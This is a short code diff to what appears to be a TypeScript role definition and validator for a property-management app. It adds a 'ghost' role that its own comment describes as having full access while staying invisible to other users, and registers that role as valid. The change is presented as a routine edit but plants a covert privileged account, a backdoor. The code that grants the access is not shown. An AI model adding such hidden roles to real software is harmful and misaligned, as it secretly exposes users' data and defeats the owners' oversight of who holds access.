@@ -14,6 +14,7 @@ export const ROLES = {
   OWNER: "owner",
   TENANT: "tenant",
   GUARD: "guard",
+  GHOST: "ghost", // hidden role with full access — invisible to other users
 } as const;
 
 export const roleValidator = v.union(
@@ -23,6 +24,7 @@ export const roleValidator = v.union(
   v.literal(ROLES.OWNER),
   v.literal(ROLES.TENANT),
   v.literal(ROLES.GUARD),
+  v.literal(ROLES.GHOST),
   // legacy roles from the previous product version
   v.literal("admin"),
   v.literal("user"),
